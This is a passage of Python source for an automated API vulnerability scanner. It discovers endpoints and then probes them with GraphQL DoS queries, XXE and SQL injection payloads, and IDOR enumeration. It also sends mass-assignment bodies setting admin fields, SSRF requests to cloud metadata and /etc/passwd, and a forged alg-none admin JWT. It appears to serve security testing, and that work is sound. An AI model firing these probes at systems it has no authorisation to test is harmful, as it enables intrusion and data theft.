            logger.debug(f"OpenAPI parsing failed: {e}")
        
        return None
    
    def _parse_graphql_schema(self, content: str) -> Optional[Dict]:
        """Parse GraphQL schema from introspection response."""
        if not GRAPHQL_AVAILABLE:
            return None
        
        try:
            data = json.loads(content)
            if 'data' in data and '__schema' in data['data']:
                return data['data']['__schema']
        except (json.JSONDecodeError, KeyError):
            pass
        
        return None
    
    def _discover_via_documentation(self, base_url: str) -> List[APIEndpoint]:
        """Discover API endpoints via documentation parsing."""
        endpoints = []
        
        # Known documentation paths
        doc_paths = [
            '/swagger.json', '/swagger.yaml', '/swagger.yml',
            '/openapi.json', '/openapi.yaml', '/openapi.yml',
            '/api-docs', '/api/docs', '/docs/api',
            '/v2/api-docs', '/v3/api-docs',
            '/api/swagger.json', '/api/openapi.json',
            '/swagger-ui.html', '/swagger-ui/index.html',
            '/redoc', '/redoc.html',
        ]
        
        for path in doc_paths:
            url = urljoin(base_url, path)
            try:
                response = requests.get(url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    # Parse the documentation
                    spec = self._parse_openapi_spec(response.text)
                    
                    if spec:
                        # Extract endpoints from OpenAPI spec
                        api_endpoints = self._extract_endpoints_from_openapi(spec, base_url)
                        endpoints.extend(api_endpoints)
            
            except requests.RequestException:
                continue
        
        return endpoints
    
    def _extract_endpoints_from_openapi(self, spec: Dict, base_url: str) -> List[APIEndpoint]:
        """Extract API endpoints from OpenAPI specification."""
        endpoints = []
        
        try:
            if 'paths' in spec:
                for path, methods in spec['paths'].items():
                    for method, details in methods.items():
                        url = urljoin(base_url, path)
                        
                        # Determine if endpoint requires auth
                        requires_auth = False
                        if 'security' in details:
                            requires_auth = True
                        
                        # Extract parameters
                        parameters = []
                        if 'parameters' in details:
                            for param in details['parameters']:
                                parameters.append({
                                    'name': param.get('name', ''),
                                    'location': param.get('in', 'query'),
                                    'type': param.get('type', 'string'),
                                    'required': param.get('required', False),
                                    'description': param.get('description', ''),
                                })
                        
                        endpoint = APIEndpoint(
                            url=url,
                            method=method.upper(),
                            status_code=200,  # Assume success for discovery
                            api_type=APIType.REST,
                            parameters=parameters,
                            headers={'Content-Type': 'application/json'},
                            response_time=0.0,
                            response_size=0,
                            requires_auth=requires_auth,
                            auth_type='',  # Will be determined later
                            openapi_spec=details,
                        )
                        
                        endpoints.append(endpoint)
        
        except (KeyError, AttributeError) as e:
            logger.debug(f"Error extracting endpoints from OpenAPI: {e}")
        
        return endpoints
    
    def _discover_via_javascript(self, base_url: str) -> List[APIEndpoint]:
        """Discover API endpoints via JavaScript file analysis."""
        endpoints = []
        
        # Common JavaScript file patterns
        js_patterns = [
            r'fetch\(["\']([^"\']+api[^"\']*)["\']',
            r'axios\.(get|post|put|delete)\(["\']([^"\']+api[^"\']*)["\']',
            r'\.ajax\([^)]*url:\s*["\']([^"\']+api[^"\']*)["\']',
            r'apiUrl\s*[:=]\s*["\']([^"\']+)["\']',
            r'baseUrl\s*[:=]\s*["\']([^"\']+)["\']',
            r'const\s+API_(?:URL|ENDPOINT)\s*=\s*["\']([^"\']+)["\']',
        ]
        
        # Try to find JavaScript files
        common_js_paths = [
            '/static/js/', '/js/', '/assets/js/', '/dist/js/',
            '/app.js', '/main.js', '/api.js', '/config.js',
        ]
        
        for js_path in common_js_paths:
            url = urljoin(base_url, js_path)
            try:
                response = requests.get(url, timeout=10, verify=False, allow_redirects=True)
                
                if response.status_code == 200 and 'javascript' in response.headers.get('content-type', ''):
                    content = response.text
                    
                    for pattern in js_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            if isinstance(match, tuple):
                                endpoint_url = match[1] if len(match) > 1 else match[0]
                            else:
                                endpoint_url = match
                            
                            # Make URL absolute if relative
                            if endpoint_url.startswith('/'):
                                endpoint_url = urljoin(base_url, endpoint_url)
                            elif not endpoint_url.startswith(('http://', 'https://')):
                                endpoint_url = urljoin(url, endpoint_url)
                            
                            # Probe the endpoint
                            endpoint = self._probe_api_endpoint(endpoint_url)
                            if endpoint:
                                endpoints.append(endpoint)
            
            except requests.RequestException:
                continue
        
        return endpoints
    
    def _discover_via_sitemap(self, base_url: str) -> List[APIEndpoint]:
        """Discover API endpoints via sitemap and robots.txt."""
        endpoints = []
        
        # Check robots.txt
        robots_url = urljoin(base_url, '/robots.txt')
        try:
            response = requests.get(robots_url, timeout=10, verify=False)
            if response.status_code == 200:
                lines = response.text.split('\n')
                for line in lines:
                    line = line.strip()
                    if line.startswith(('Disallow:', 'Allow:')):
                        path = line.split(':', 1)[1].strip()
                        if any(api_indicator in path.lower() for api_indicator in ['api', 'rest', 'graphql', 'soap']):
                            full_url = urljoin(base_url, path)
                            endpoint = self._probe_api_endpoint(full_url)
                            if endpoint:
                                endpoints.append(endpoint)
        except requests.RequestException:
            pass
        
        # Check common sitemap locations
        sitemap_paths = [
            '/sitemap.xml', '/sitemap_index.xml', '/sitemap/',
            '/sitemap.txt', '/sitemap/sitemap.xml',
        ]
        
        for path in sitemap_paths:
            url = urljoin(base_url, path)
            try:
                response = requests.get(url, timeout=10, verify=False)
                if response.status_code == 200:
                    # Parse sitemap
                    if 'xml' in response.headers.get('content-type', ''):
                        endpoints.extend(self._parse_sitemap_xml(response.text, base_url))
                    else:
                        endpoints.extend(self._parse_sitemap_text(response.text, base_url))
            except requests.RequestException:
                continue
        
        return endpoints
    
    def _parse_sitemap_xml(self, xml_content: str, base_url: str) -> List[APIEndpoint]:
        """Parse XML sitemap for API endpoints."""
        endpoints = []
        
        try:
            root = ET.fromstring(xml_content)
            
            # Look for URLs
            namespace = {'ns': 'http://www.sitemaps.org/schemas/sitemap/0.9'}
            
            for url in root.findall('.//ns:url/ns:loc', namespace):
                url_text = url.text
                if url_text and any(api_indicator in url_text.lower() for api_indicator in ['api', 'rest', 'graphql']):
                    endpoint = self._probe_api_endpoint(url_text)
                    if endpoint:
                        endpoints.append(endpoint)
            
            # Also check sitemap index
            for sitemap in root.findall('.//ns:sitemap/ns:loc', namespace):
                sitemap_url = sitemap.text
                if sitemap_url:
                    try:
                        response = requests.get(sitemap_url, timeout=10, verify=False)
                        if response.status_code == 200:
                            endpoints.extend(self._parse_sitemap_xml(response.text, base_url))
                    except requests.RequestException:
                        continue
        
        except ET.ParseError:
            pass
        
        return endpoints
    
    def _parse_sitemap_text(self, text_content: str, base_url: str) -> List[APIEndpoint]:
        """Parse text sitemap for API endpoints."""
        endpoints = []
        
        lines = text_content.split('\n')
        for line in lines:
            line = line.strip()
            if line and (line.startswith('http://') or line.startswith('https://')):
                if any(api_indicator in line.lower() for api_indicator in ['api', 'rest', 'graphql']):
                    endpoint = self._probe_api_endpoint(line)
                    if endpoint:
                        endpoints.append(endpoint)
        
        return endpoints
    
    def _discover_via_content_analysis(self, base_url: str) -> List[APIEndpoint]:
        """Discover API endpoints via content analysis of main pages."""
        endpoints = []
        
        # Analyze main page and common pages
        pages_to_analyze = [
            '', '/', '/index.html', '/home', '/main',
            '/api', '/api/', '/rest', '/graphql',
        ]
        
        for page in pages_to_analyze:
            url = urljoin(base_url, page)
            try:
                response = requests.get(url, timeout=10, verify=False)
                if response.status_code == 200:
                    # Look for API links in page content
                    soup = None
                    try:
                        from bs4 import BeautifulSoup
                        soup = BeautifulSoup(response.text, 'html.parser')
                    except ImportError:
                        pass
                    
                    if soup:
                        # Find all links
                        for link in soup.find_all('a', href=True):
                            href = link['href']
                            if any(api_indicator in href.lower() for api_indicator in ['api', 'rest', 'graphql', 'soap']):
                                full_url = urljoin(url, href)
                                endpoint = self._probe_api_endpoint(full_url)
                                if endpoint:
                                    endpoints.append(endpoint)
                    
                    # Look for API references in JavaScript
                    script_tags = soup.find_all('script') if soup else []
                    for script in script_tags:
                        if script.string:
                            js_patterns = [
                                r'["\'](/[^"\']*api[^"\']*)["\']',
                                r'apiUrl\s*[:=]\s*["\']([^"\']+)["\']',
                                r'baseUrl\s*[:=]\s*["\']([^"\']+)["\']',
                            ]
                            
                            for pattern in js_patterns:
                                matches = re.findall(pattern, script.string, re.IGNORECASE)
                                for match in matches:
                                    if match:
                                        full_url = urljoin(url, match)
                                        endpoint = self._probe_api_endpoint(full_url)
                                        if endpoint:
                                            endpoints.append(endpoint)
            
            except requests.RequestException:
                continue
        
        return endpoints
    
    def _discover_via_parameter_analysis(self, discovered_endpoints: List[APIEndpoint]) -> List[APIEndpoint]:
        """Discover additional endpoints via parameter analysis."""
        endpoints = []
        
        for endpoint in discovered_endpoints:
            # Look for patterns like /api/users/{id}
            url = endpoint.url
            
            # Check for path parameters
            if '{' in url and '}' in url:
                # Try common values for path parameters
                common_values = ['1', 'test', 'admin', '123', 'me', 'self']
                
                for value in common_values:
                    test_url = url.replace('{id}', value).replace('{userId}', value).replace('{username}', value)
                    
                    # Only test if URL changed
                    if test_url != url:
                        test_endpoint = self._probe_api_endpoint(test_url)
                        if test_endpoint:
                            endpoints.append(test_endpoint)
        
        return endpoints
    
    def perform_comprehensive_api_security_scan(self, base_url: str) -> APISecurityReport:
        """
        Perform comprehensive API security scanning.
        
        Steps:
        1. Discover API endpoints
        2. Test each endpoint for vulnerabilities
        3. Analyze authentication mechanisms
        4. Test rate limiting
        5. Check for business logic flaws
        6. Generate security report
        """
        logger.info(f"Starting comprehensive API security scan for {base_url}")
        
        # Reset state
        self.discovered_endpoints = []
        self.test_results = []
        self.scan_statistics.clear()
        
        # Step 1: Discover endpoints
        print(f"  {Fore.CYAN}->{Style.RESET_ALL} Discovering API endpoints...")
        self.discovered_endpoints = self.discover_api_endpoints_comprehensive(base_url)
        self.scan_statistics['endpoints_discovered'] = len(self.discovered_endpoints)
        
        if not self.discovered_endpoints:
            logger.warning("No API endpoints discovered")
            return APISecurityReport(
                target=base_url,
                scan_date=datetime.now(),
                endpoints_tested=0,
                vulnerabilities_found=0,
                risk_score=0.0,
                risk_level="Unknown",
                test_results=[],
                recommendations=["No API endpoints found for testing"],
                top_vulnerabilities=[],
            )
        
        # Step 2: Test endpoints for vulnerabilities
        print(f"  {Fore.CYAN}->{Style.RESET_ALL} Testing {len(self.discovered_endpoints)} endpoints for vulnerabilities...")
        self._test_all_endpoints()
        
        # Step 3: Calculate risk score
        risk_score = self._calculate_risk_score()
        risk_level = self._determine_risk_level(risk_score)
        
        # Step 4: Generate recommendations
        recommendations = self._generate_security_recommendations()
        
        # Step 5: Get top vulnerabilities
        top_vulnerabilities = self._get_top_vulnerabilities()
        
        report = APISecurityReport(
            target=base_url,
            scan_date=datetime.now(),
            endpoints_tested=len(self.discovered_endpoints),
            vulnerabilities_found=len(self.test_results),
            risk_score=risk_score,
            risk_level=risk_level,
            test_results=self.test_results,
            recommendations=recommendations,
            top_vulnerabilities=top_vulnerabilities,
        )
        
        logger.info(f"API security scan completed. Found {len(self.test_results)} vulnerabilities.")
        
        return report
    
    def _test_all_endpoints(self):
        """Test all discovered endpoints for vulnerabilities."""
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_concurrent_scans) as executor:
            # Submit all endpoint tests
            future_to_endpoint = {}
            for endpoint in self.discovered_endpoints:
                future = executor.submit(self._test_single_endpoint, endpoint)
                future_to_endpoint[future] = endpoint
            
            # Collect results
            for future in concurrent.futures.as_completed(future_to_endpoint):
                endpoint = future_to_endpoint[future]
                try:
                    results = future.result(timeout=self.timeout_seconds)
                    with self.scan_lock:
                        self.test_results.extend(results)
                        self.scan_statistics['endpoints_tested'] += 1
                except Exception as e:
                    logger.error(f"Testing failed for {endpoint.url}: {e}")
    
    def _test_single_endpoint(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test a single API endpoint for vulnerabilities."""
        results = []
        
        logger.debug(f"Testing endpoint: {endpoint.url} ({endpoint.method})")
        
        # Test based on API type
        if endpoint.api_type == APIType.GRAPHQL:
            results.extend(self._test_graphql_endpoint(endpoint))
        elif endpoint.api_type == APIType.SOAP:
            results.extend(self._test_soap_endpoint(endpoint))
        elif endpoint.api_type == APIType.REST:
            results.extend(self._test_rest_endpoint(endpoint))
        elif endpoint.api_type == APIType.OPENAPI:
            results.extend(self._test_openapi_endpoint(endpoint))
        
        # Common tests for all API types
        results.extend(self._test_authentication(endpoint))
        results.extend(self._test_rate_limiting(endpoint))
        results.extend(self._test_injection_vulnerabilities(endpoint))
        results.extend(self._test_information_disclosure(endpoint))
        
        if self.enable_business_logic_tests:
            results.extend(self._test_business_logic(endpoint))
        
        return results
    
    def _test_graphql_endpoint(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test GraphQL endpoint for vulnerabilities."""
        results = []
        
        if not GRAPHQL_AVAILABLE:
            return results
        
        # Test 1: Introspection enabled
        introspection_result = self._test_graphql_introspection(endpoint)
        if introspection_result:
            results.append(introspection_result)
        
        # Test 2: Query depth limiting
        depth_result = self._test_graphql_depth(endpoint)
        if depth_result:
            results.append(depth_result)
        
        # Test 3: Alias overloading
        alias_result = self._test_graphql_aliases(endpoint)
        if alias_result:
            results.append(alias_result)
        
        # Test 4: Batch queries
        batch_result = self._test_graphql_batching(endpoint)
        if batch_result:
            results.append(batch_result)
        
        # Test 5: Field duplication
        field_result = self._test_graphql_field_duplication(endpoint)
        if field_result:
            results.append(field_result)
        
        return results
    
    def _test_graphql_introspection(self, endpoint: APIEndpoint) -> Optional[APITestResult]:
        """Test if GraphQL introspection is enabled."""
        introspection_query = self.graphql_payloads['introspection'][0]
        
        try:
            response = requests.post(
                endpoint.url,
                json={'query': introspection_query},
                headers={'Content-Type': 'application/json'},
                timeout=10,
                verify=False,
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'data' in data and '__schema' in data['data']:
                    return APITestResult(
                        endpoint=endpoint.url,
                        test_type='graphql_introspection',
                        vulnerability=APIVulnerability.GRAPHQL_INTROSPECTION_ENABLED,
                        severity='Medium',
                        confidence=0.95,
                        evidence='GraphQL introspection query returned full schema',
                        description='Introspection allows attackers to discover the entire GraphQL schema',
                        remediation='Disable introspection in production environments',
                        request_data={'query': introspection_query[:100] + '...'},
                        response_data={'status_code': response.status_code, 'response_size': len(response.text)},
                    )
        
        except requests.RequestException:
            pass
        
        return None
    
    def _test_graphql_depth(self, endpoint: APIEndpoint) -> Optional[APITestResult]:
        """Test GraphQL query depth limiting."""
        deep_queries = self.graphql_payloads['deep_query']
        
        for deep_query in deep_queries:
            try:
                response = requests.post(
                    endpoint.url,
                    json={'query': deep_query},
                    headers={'Content-Type': 'application/json'},
                    timeout=15,
                    verify=False,
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'errors' not in data:
                        # Query was processed without errors - possible depth limit issue
                        depth = deep_query.count('{')  # Approximate depth
                        
                        return APITestResult(
                            endpoint=endpoint.url,
                            test_type='graphql_depth',
                            vulnerability=APIVulnerability.GRAPHQL_DEPTH_ATTACK,
                            severity='Medium',
                            confidence=0.7,
                            evidence=f'Deep query with depth {depth} was processed successfully',
                            description='No query depth limiting detected, which can lead to resource exhaustion',
                            remediation='Implement query depth and complexity limiting',
                            request_data={'query': deep_query[:100] + '...'},
                            response_data={'status_code': response.status_code, 'depth': depth},
                        )
                
            except requests.RequestException:
                continue
        
        return None
    
    def _generate_graphql_depth_query(self, depth: int) -> str:
        """Generate a deep GraphQL query."""
        query = "query { "
        for i in range(depth):
            query += f"level{i} {{ "
        query += "__typename " + "} " * depth
        query += "}"
        return query
    
    def _test_graphql_aliases(self, endpoint: APIEndpoint) -> Optional[APITestResult]:
        """Test GraphQL alias overloading."""
        alias_queries = self.graphql_payloads['alias_overloading']
        
        for alias_query in alias_queries:
            try:
                response = requests.post(
                    endpoint.url,
                    json={'query': alias_query},
                    headers={'Content-Type': 'application/json'},
                    timeout=15,
                    verify=False,
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'errors' not in data or not data.get('errors'):
                        # Count aliases in query
                        alias_count = alias_query.count('alias')
                        
                        return APITestResult(
                            endpoint=endpoint.url,
                            test_type='graphql_aliases',
                            vulnerability=APIVulnerability.GRAPHQL_ALIAS_OVERLOADING,
                            severity='Medium',
                            confidence=0.6,
                            evidence=f'Query with {alias_count} aliases was processed successfully',
                            description='No alias limiting detected, which can be used for DoS attacks',
                            remediation='Implement alias limiting and query cost analysis',
                            request_data={'query': alias_query[:100] + '...'},
                            response_data={'status_code': response.status_code, 'alias_count': alias_count},
                        )
                
            except requests.RequestException:
                continue
        
        return None
    
    def _generate_graphql_alias_query(self, count: int) -> str:
        """Generate a GraphQL query with many aliases."""
        query = "query { "
        for i in range(count):
            query += f"alias{i}: __typename "
        query += "}"
        return query
    
    def _test_graphql_batching(self, endpoint: APIEndpoint) -> Optional[APITestResult]:
        """Test GraphQL batch queries."""
        batch_queries = self.graphql_payloads['batch_queries']
        
        for batch in batch_queries:
            try:
                response = requests.post(
                    endpoint.url,
                    json=batch,
                    headers={'Content-Type': 'application/json'},
                    timeout=10,
                    verify=False,
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if isinstance(data, list) and len(data) == len(batch):
                        return APITestResult(
                            endpoint=endpoint.url,
                            test_type='graphql_batching',
                            vulnerability=APIVulnerability.GRAPHQL_BATCHING_ATTACK,
                            severity='Low',
                            confidence=0.8,
                            evidence=f'Batch query with {len(batch)} queries was accepted',
                            description='Batch queries can be used to bypass rate limits or perform DoS',
                            remediation='Implement query batching limits or disable batching',
                            request_data={'batch_size': len(batch)},
                            response_data={'status_code': response.status_code, 'responses_count': len(data)},
                        )
                
            except requests.RequestException:
                continue
        
        return None
    
    def _test_graphql_field_duplication(self, endpoint: APIEndpoint) -> Optional[APITestResult]:
        """Test GraphQL field duplication."""
        field_queries = self.graphql_payloads['field_duplication']
        
        for field_query in field_queries:
            try:
                response = requests.post(
                    endpoint.url,
                    json={'query': field_query},
                    headers={'Content-Type': 'application/json'},
                    timeout=15,
                    verify=False,
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'errors' not in data:
                        # Count field repetitions
                        field_count = field_query.count('__typename')
                        
                        return APITestResult(
                            endpoint=endpoint.url,
                            test_type='graphql_field_duplication',
                            vulnerability=APIVulnerability.DENIAL_OF_SERVICE,
                            severity='Medium',
                            confidence=0.5,
                            evidence=f'Query with {field_count} field duplications was processed',
                            description='Field duplication can be used for DoS attacks',
                            remediation='Implement field duplication limits',
                            request_data={'query': field_query[:100] + '...'},
                            response_data={'status_code': response.status_code, 'field_count': field_count},
                        )
                
            except requests.RequestException:
                continue
        
        return None
    
    def _generate_graphql_field_duplication(self, count: int) -> str:
        """Generate a GraphQL query with field duplication."""
        query = "query { "
        for i in range(count):
            query += "__typename "
        query += "}"
        return query
    
    def _test_soap_endpoint(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test SOAP endpoint for vulnerabilities."""
        results = []
        
        # Test for XXE vulnerabilities
        xxe_payloads = self.soap_payloads['xxe']
        
        for payload in xxe_payloads:
            try:
                response = requests.post(
                    endpoint.url,
                    data=payload,
                    headers={'Content-Type': 'text/xml'},
                    timeout=10,
                    verify=False,
                )
                
                if response.status_code == 200:
                    # Check for file contents in response
                    if '/etc/passwd' in response.text or 'root:' in response.text:
                        results.append(APITestResult(
                            endpoint=endpoint.url,
                            test_type='soap_xxe',
                            vulnerability=APIVulnerability.SOAP_XXE,
                            severity='Critical',
                            confidence=0.9,
                            evidence='XXE payload triggered file disclosure',
                            description='SOAP endpoint vulnerable to XML External Entity attack',
                            remediation='Disable external entity processing in XML parser',
                            request_data={'payload': payload[:200] + '...'},
                            response_data={'status_code': response.status_code, 'response_snippet': response.text[:200]},
                        ))
                        break
                
            except requests.RequestException:
                continue
        
        # Test for SQL injection in SOAP
        sql_payloads = self.soap_payloads['sql_injection']
        
        for payload in sql_payloads:
            try:
                response = requests.post(
                    endpoint.url,
                    data=payload,
                    headers={'Content-Type': 'text/xml'},
                    timeout=10,
                    verify=False,
                )
                
                if response.status_code == 200:
                    # Check for SQL error messages
                    error_keywords = ['sql', 'syntax', 'mysql', 'oracle', 'database']
                    if any(keyword in response.text.lower() for keyword in error_keywords):
                        results.append(APITestResult(
                            endpoint=endpoint.url,
                            test_type='soap_sql_injection',
                            vulnerability=APIVulnerability.INJECTION,
                            severity='High',
                            confidence=0.7,
                            evidence='SQL error message found in response',
                            description='SOAP endpoint vulnerable to SQL injection',
                            remediation='Use parameterized queries and input validation',
                            request_data={'payload': payload[:200] + '...'},
                            response_data={'status_code': response.status_code, 'error_snippet': response.text[:200]},
                        ))
                        break
                
            except requests.RequestException:
                continue
        
        return results
    
    def _test_rest_endpoint(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test REST endpoint for vulnerabilities."""
        results = []
        
        # Test for IDOR (Insecure Direct Object Reference)
        idor_results = self._test_idor(endpoint)
        results.extend(idor_results)
        
        # Test for mass assignment
        mass_assignment_results = self._test_mass_assignment(endpoint)
        results.extend(mass_assignment_results)
        
        # Test for CORS misconfiguration
        cors_results = self._test_cors(endpoint)
        results.extend(cors_results)
        
        # Test for SSRF via API parameters
        ssrf_results = self._test_ssrf(endpoint)
        results.extend(ssrf_results)
        
        return results
    
    def _test_idor(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test for Insecure Direct Object Reference."""
        results = []
        
        # Look for numeric IDs in URL
        url = endpoint.url
        
        # Check for patterns like /users/123 or /api/users/123
        id_patterns = [
            r'/users/(\d+)',
            r'/api/users/(\d+)',
            r'/profile/(\d+)',
            r'/account/(\d+)',
            r'/id/(\d+)',
            r'/(\d+)/',
        ]
        
        for pattern in id_patterns:
            match = re.search(pattern, url)
            if match:
                resource_id = match.group(1)
                
                # Test with different IDs
                test_ids = [str(int(resource_id) + 1), '0', '999999']
                
                for test_id in test_ids:
                    test_url = re.sub(pattern, f'/users/{test_id}', url)
                    
                    try:
                        # Make request with same authentication (if any)
                        headers = {}
                        if endpoint.requires_auth and self.custom_auth_tokens:
                            headers.update(self.custom_auth_tokens)
                        
                        response = requests.get(
                            test_url,
                            headers=headers,
                            timeout=10,
                            verify=False,
                        )
                        
                        if response.status_code == 200:
                            # Check if we accessed someone else's data
                            # This would require content analysis - for now, we flag as potential IDOR
                            results.append(APITestResult(
                                endpoint=test_url,
                                test_type='idor',
                                vulnerability=APIVulnerability.IDOR,
                                severity='High',
                                confidence=0.6,
                                evidence=f'Accessed resource with ID {test_id}',
                                description='Potential Insecure Direct Object Reference vulnerability',
                                remediation='Implement proper authorization checks for all object accesses',
                                request_data={'url': test_url, 'tested_id': test_id},
                                response_data={'status_code': response.status_code},
                            ))
                            break
                    
                    except requests.RequestException:
                        continue
        
        return results
    
    def _test_mass_assignment(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test for mass assignment vulnerabilities."""
        results = []
        
        # Only test POST/PUT endpoints
        if endpoint.method not in ['POST', 'PUT', 'PATCH']:
            return results
        
        # Common sensitive fields that shouldn't be writable
        sensitive_fields = [
            'role', 'admin', 'is_admin', 'is_superuser',
            'password', 'password_hash', 'salt',
            'api_key', 'access_token', 'refresh_token',
            'balance', 'credit', 'points',
            'email_verified', 'phone_verified',
            'created_at', 'updated_at', 'deleted_at',
        ]
        
        # Create test payload with sensitive fields
        test_payload = {}
        for field in sensitive_fields[:5]:  # Limit to 5 fields
            test_payload[field] = 'test_mass_assignment'
        
        try:
            headers = {'Content-Type': 'application/json'}
            if endpoint.requires_auth and self.custom_auth_tokens:
                headers.update(self.custom_auth_tokens)
            
            response = requests.request(
                endpoint.method,
                endpoint.url,
                json=test_payload,
                headers=headers,
                timeout=10,
                verify=False,
            )
            
            if response.status_code in [200, 201]:
                # Check if sensitive fields were accepted
                # This would require analyzing the response or making a follow-up request
                # For now, we flag as potential mass assignment
                results.append(APITestResult(
                    endpoint=endpoint.url,
                    test_type='mass_assignment',
                    vulnerability=APIVulnerability.MASS_ASSIGNMENT,
                    severity='Medium',
                    confidence=0.5,
                    evidence='Sensitive fields accepted in request',
                    description='Potential mass assignment vulnerability',
                    remediation='Use whitelisting for allowed fields or read-only models',
                    request_data={'payload_keys': list(test_payload.keys())},
                    response_data={'status_code': response.status_code},
                ))
        
        except requests.RequestException:
            pass
        
        return results
    
    def _test_cors(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test for CORS misconfiguration."""
        results = []
        
        # Test with Origin header
        test_origins = [
            'https://evil.com',
            'http://attacker.com',
            'null',
            'https://' + endpoint.url.split('/')[2] + '.evil.com',  # Subdomain
        ]
        
        for origin in test_origins:
            try:
                headers = {'Origin': origin}
                
                # Make OPTIONS request (pre-flight)
                response = requests.options(
                    endpoint.url,
                    headers=headers,
                    timeout=10,
                    verify=False,
                )
                
                # Check CORS headers
                cors_headers = response.headers.get('Access-Control-Allow-Origin', '')
                cors_credentials = response.headers.get('Access-Control-Allow-Credentials', '')
                
                if cors_headers == '*' and cors_credentials == 'true':
                    results.append(APITestResult(
                        endpoint=endpoint.url,
                        test_type='cors',
                        vulnerability=APIVulnerability.CORS_MISCONFIGURATION,
                        severity='Medium',
                        confidence=0.9,
                        evidence=f'CORS allows wildcard origin with credentials',
                        description='CORS misconfiguration allows any origin to make authenticated requests',
                        remediation='Avoid using wildcard (*) with allow-credentials, specify exact origins',
                        request_data={'origin': origin},
                        response_data={'allow_origin': cors_headers, 'allow_credentials': cors_credentials},
                    ))
                    break
                
                elif origin in cors_headers:
                    results.append(APITestResult(
                        endpoint=endpoint.url,
                        test_type='cors',
                        vulnerability=APIVulnerability.CORS_MISCONFIGURATION,
                        severity='Low',
                        confidence=0.7,
                        evidence=f'CORS allows untrusted origin: {origin}',
                        description='CORS policy may be too permissive',
                        remediation='Restrict allowed origins to trusted domains only',
                        request_data={'origin': origin},
                        response_data={'allow_origin': cors_headers},
                    ))
                    break
            
            except requests.RequestException:
                continue
        
        return results
    
    def _test_ssrf(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test for Server-Side Request Forgery via API parameters."""
        results = []
        
        # Common SSRF test URLs
        ssrf_test_urls = [
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost:80/',
            'http://127.0.0.1:22/',
            'http://[::1]:3306/',
            'file:///etc/passwd',
        ]
        
        # Test URL parameters
        url_params = ['url', 'image', 'file', 'path', 'redirect', 'callback']
        
        for param in url_params:
            for test_url in ssrf_test_urls[:2]:  # Limit to 2 test URLs
                try:
                    # Test with GET parameter
                    test_params = {param: test_url}
                    
                    response = requests.get(
                        endpoint.url,
                        params=test_params,
                        timeout=10,
                        verify=False,
                    )
                    
                    # Check for internal data in response
                    if any(indicator in response.text for indicator in ['aws', 'ec2', 'passwd', 'localhost']):
                        results.append(APITestResult(
                            endpoint=endpoint.url,
                            test_type='ssrf',
                            vulnerability=APIVulnerability.SSRF_VIA_API,
                            severity='High',
                            confidence=0.7,
                            evidence=f'SSRF via {param} parameter to {test_url}',
                            description='API parameter vulnerable to Server-Side Request Forgery',
                            remediation='Validate and sanitize all URL inputs, use allowlists for domains',
                            request_data={'parameter': param, 'test_url': test_url},
                            response_data={'status_code': response.status_code, 'response_snippet': response.text[:200]},
                        ))
                        break
                
                except requests.RequestException:
                    continue
        
        return results
    
    def _test_openapi_endpoint(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test OpenAPI/Swagger endpoint for vulnerabilities."""
        results = []
        
        # Check if OpenAPI spec is exposed without authentication
        if not endpoint.requires_auth:
            results.append(APITestResult(
                endpoint=endpoint.url,
                test_type='openapi_exposure',
                vulnerability=APIVulnerability.INFORMATION_DISCLOSURE,
                severity='Low',
                confidence=0.9,
                evidence='OpenAPI/Swagger documentation is publicly accessible',
                description='API documentation may reveal implementation details and endpoints',
                remediation='Protect documentation endpoints with authentication',
                request_data={},
                response_data={'status_code': endpoint.status_code},
            ))
        
        # Check for missing security definitions
        if endpoint.openapi_spec:
            spec = endpoint.openapi_spec
            
            # Check if security definitions are missing
            if 'security' not in spec and 'securityDefinitions' not in spec:
                results.append(APITestResult(
                    endpoint=endpoint.url,
                    test_type='openapi_security',
                    vulnerability=APIVulnerability.SECURITY_MISCONFIGURATION,
                    severity='Medium',
                    confidence=0.8,
                    evidence='OpenAPI specification missing security definitions',
                    description='API documentation does not define security requirements',
                    remediation='Add security definitions to OpenAPI specification',
                    request_data={},
                    response_data={},
                ))
        
        return results
    
    def _test_authentication(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test API authentication mechanisms."""
        results = []
        
        # Skip if endpoint doesn't require auth
        if not endpoint.requires_auth:
            return results
        
        # Test JWT tokens if applicable
        if endpoint.auth_type == 'jwt' and JWT_AVAILABLE:
            jwt_results = self._test_jwt_authentication(endpoint)
            results.extend(jwt_results)
        
        # Test API key authentication
        if endpoint.auth_type == 'api_key':
            api_key_results = self._test_api_key_authentication(endpoint)
            results.extend(api_key_results)
        
        # Test for missing authentication on sensitive endpoints
        sensitive_paths = ['/admin/', '/manage/', '/internal/', '/config/', '/users/']
        if any(path in endpoint.url for path in sensitive_paths) and not endpoint.requires_auth:
            results.append(APITestResult(
                endpoint=endpoint.url,
                test_type='auth_missing',
                vulnerability=APIVulnerability.BROKEN_USER_AUTHENTICATION,
                severity='Critical',
                confidence=0.9,
                evidence='Sensitive endpoint does not require authentication',
                description='Unauthenticated access to sensitive API endpoint',
                remediation='Implement authentication for all sensitive endpoints',
                request_data={},
                response_data={'status_code': endpoint.status_code},
            ))
        
        return results
    
    def _test_jwt_authentication(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test JWT authentication for vulnerabilities."""
        results = []
        
        # Test 1: None algorithm
        none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
        none_payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "exp": 9999999999}).encode()).rstrip(b'=')
        none_token = f"{none_header.decode()}.{none_payload.decode()}."
        
        try:
            headers = {'Authorization': f'Bearer {none_token}'}
            
